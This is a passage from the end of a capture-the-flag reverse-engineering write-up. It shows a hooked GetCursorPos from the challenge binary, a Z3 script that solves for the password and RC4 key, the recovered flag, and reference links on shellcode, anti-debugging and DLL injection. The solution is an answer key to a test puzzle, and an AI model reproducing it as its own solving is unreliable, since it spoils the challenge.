<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">hook_GetCursorPos</span><span class="p">(</span><span class="n">POINT</span> <span class="o">*</span><span class="n">point</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">point</span><span class="o">-&gt;</span><span class="n">y</span> <span class="o">=</span> <span class="n">g_Y_cursor_pos</span><span class="p">[</span><span class="n">g_IncrementedByEachSleep</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">point</span><span class="o">-&gt;</span><span class="n">x</span> <span class="o">=</span> <span class="n">g_X_cursor_pos</span><span class="p">[</span><span class="n">g_IncrementedByEachSleep</span> <span class="o">%</span> <span class="mh">0x21</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">g_Y_cursor_pos</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">g_X_cursor_pos</span>  <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x9c</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><p>We do not have to guess the cursor positions anymore!</p>
<h3 id="35-the-final-password">3.5 The final password</h3>
<p>With these new information, the routine we&rsquo;ve stumbled upon earlier makes much more sense:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// do actual base64 decoding but also
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// initialize a counter to 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">CryptStringToBinaryA</span><span class="p">(</span><span class="n">input_password</span><span class="p">,</span> <span class="n">cchString</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="n">decoded_base64</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pcbBinary</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pdwFlags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// with the hook it now returns (x, y) position from 2 known arrays
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span> <span class="n">GetCursorPos</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Point</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">point_y</span> <span class="o">=</span> <span class="n">Point</span><span class="p">.</span><span class="n">y</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">decoded_base64</span><span class="p">[</span><span class="n">n</span> <span class="o">%</span> <span class="n">decStrLen</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v12</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v13</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v14</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>                       <span class="c1">// odd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">v13</span> <span class="o">&lt;&lt;</span> <span class="n">point_y</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v12</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v16</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">&gt;&gt;</span> <span class="n">point_y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>                                      <span class="c1">// even
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">v13</span> <span class="o">&gt;&gt;</span> <span class="n">point_y</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v12</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v16</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">&lt;&lt;</span> <span class="n">point_y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// we want this to be TRUE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">v16</span> <span class="o">|</span> <span class="n">v15</span><span class="p">)</span> <span class="o">==</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">Point</span><span class="p">.</span><span class="n">x</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded_base64</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">dec_byte</span><span class="p">;</span>			<span class="c1">// replace the byte in place in the string
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">      <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// increment a counter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">Sleep</span><span class="p">(</span><span class="mh">0x1Eu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="n">decStrLen</span> <span class="o">=</span> <span class="n">strlen_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">n</span> <span class="o">&gt;=</span> <span class="n">strlen_size</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">CHECK_CHAR_SET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">NOPE</span><span class="p">;</span>
</span></span></code></pre></div><p>we can put everything together in a final script.</p>
<ul>
<li>(Ab)use Z3 to figure the correct input</li>
<li>use these input to get the key</li>
<li>use the key to get the flag</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ARC4</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># crypted string</span>
</span></span><span class="line"><span class="cl"><span class="n">crypted_dw</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x0A39BB17F</span><span class="p">,</span> <span class="mh">0x987AB8DB</span><span class="p">,</span> <span class="mh">0x2F6BE93E</span><span class="p">,</span> <span class="mh">0x5A40C4AC</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x5F900F42</span><span class="p">,</span> <span class="mh">0x0AB9CF15C</span><span class="p">,</span> <span class="mh">0x0F51B7932</span><span class="p">,</span> <span class="mh">0x6A3CA0C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x4A4A45C4</span><span class="p">,</span> <span class="mh">0x21591DF6</span><span class="p">,</span> <span class="mh">0x0C7F3DA41</span><span class="p">,</span> <span class="mh">0x0A3EEEFBA</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x45820D2D</span><span class="p">,</span> <span class="mh">0x34D33517</span><span class="p">,</span> <span class="mh">0x0D7C3DCCB</span><span class="p">,</span> <span class="mh">0x0FA5E5BB3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x69E23F67</span><span class="p">,</span> <span class="mh">0x5A4102EF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># just build a bytes string from from the above dwords</span>
</span></span><span class="line"><span class="cl"><span class="n">crypted</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">crypted_dw</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">crypted</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># (x, y) positions from the dll</span>
</span></span><span class="line"><span class="cl"><span class="n">y_positions</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">x_positions</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x9c</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">GetCursorPos</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39; emulate hooked GetCursorPos
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">y</span> <span class="o">=</span> <span class="n">y_positions</span><span class="p">[</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">x_positions</span><span class="p">[</span><span class="n">c</span> <span class="o">%</span> <span class="mh">0x21</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># abuse z3 to find a valid input</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="mi">33</span>   <span class="c1"># size of the input key // 0x21 .. size of x_positions array</span>
</span></span><span class="line"><span class="cl"><span class="n">inp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># create input and output BitVec</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the output are just to get the key straight away</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">inp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;i</span><span class="si">%d</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">x</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;o</span><span class="si">%d</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">x</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># initialize the global counter</span>
</span></span><span class="line"><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># run the little routine with GetCursorPos</span>
</span></span><span class="line"><span class="cl"><span class="c1"># it&#39;s just ROL/ROR</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">inp</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">GetCursorPos</span><span class="p">(</span><span class="n">counter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">y</span> <span class="o">=</span> <span class="n">y</span> <span class="o">&amp;</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pos</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_byte</span> <span class="o">=</span> <span class="n">RotateRight</span><span class="p">(</span><span class="n">inp</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">check</span> <span class="o">=</span>    <span class="n">RotateLeft</span><span class="p">(</span><span class="n">inp</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_byte</span> <span class="o">=</span> <span class="n">RotateLeft</span><span class="p">(</span><span class="n">inp</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">check</span> <span class="o">=</span>    <span class="n">RotateRight</span><span class="p">(</span><span class="n">inp</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># the actual constrain we want to fullfil</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># if ( (v16 | v15) == LOBYTE(Point.x) )</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="n">check</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># (dirty?) trick to get the output value straight away</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">==</span> <span class="n">dec_byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Sleep()</span>
</span></span><span class="line"><span class="cl">    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hopefully will not happen</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">!=</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># we found a valid input</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pwd</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get input (password) and output (key) values from the model</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">inp</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">pwd</span> <span class="o">+=</span> <span class="n">m</span><span class="p">[</span><span class="n">inp</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">out</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;password: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pwd</span><span class="p">),</span> <span class="s1">&#39;ascii&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;key     : </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get flag</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">ARC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s1">&#39;ascii&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">crypted</span><span class="p">),</span> <span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag    : </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><p>Running the script yields this output:</p>
<pre tabindex="0"><code>% python l3.py 
password: ua2wsWz1aPZvbZv1bbBbZV+wryaW7PqMpcxmZZOs3GOy
key     : small_hooks_make_a_big_difference
flag    : flag{you_got_this_best_of_luck_in_reversing_and_beware_of_red_herrings}
</code></pre><p><img src="60-win.jpg" alt="win"></p>
<h2 id="6-references">6. References</h2>
<p>Dynamic API functions address resolution:</p>
<ul>
<li><a href="https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/">https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/</a></li>
<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode</a></li>
</ul>
<p>Tools for dealing with hashes:</p>
<ul>
<li><a href="https://github.com/mandiant/flare-ida">https://github.com/mandiant/flare-ida</a></li>
<li><a href="https://github.com/OALabs/hashdb">https://github.com/OALabs/hashdb</a></li>
</ul>
<p>PE to shellcode:</p>
<ul>
<li><a href="https://github.com/hasherezade/pe_to_shellcode">https://github.com/hasherezade/pe_to_shellcode</a></li>
<li><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></li>
</ul>
<p>Anti Debug:</p>
<ul>
<li><a href="https://github.com/hasherezade/antianalysis_demos/blob/master/kernelmode_antidbg.cpp">https://github.com/hasherezade/antianalysis_demos/blob/master/kernelmode_antidbg.cpp</a></li>
<li><a href="https://anti-reversing.com/Downloads/Anti-Reversing/The_Ultimate_Anti-Reversing_Reference.pdf">https://anti-reversing.com/Downloads/Anti-Reversing/The_Ultimate_Anti-Reversing_Reference.pdf</a></li>
</ul>
<p>RC4:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/RC4">https://en.wikipedia.org/wiki/RC4</a></li>
</ul>
<p>Code Injection:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/DLL_injection#Using_the_LoadLibrary_API_function">https://en.wikipedia.org/wiki/DLL_injection#Using_the_LoadLibrary_API_function</a></li>
</ul>
<p>Hooking:</p>
<ul>
